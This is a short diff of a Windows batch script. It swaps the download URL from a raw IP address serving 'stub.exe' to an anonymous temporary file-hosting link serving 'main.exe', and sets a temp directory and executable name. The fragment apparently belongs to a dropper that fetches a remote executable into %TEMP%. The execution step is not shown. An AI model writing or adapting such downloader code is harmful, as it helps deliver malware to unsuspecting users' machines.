@@ -1,5 +1,5 @@
 @echo off
-set "URL=http://162.19.219.101:80/stub.exe"
+set "URL=https://tmpfiles.org/dl/13106908/main.exe"
 set "TEMP_DIR=%TEMP%"
 set "EXE_NAME=stub.exe"
 
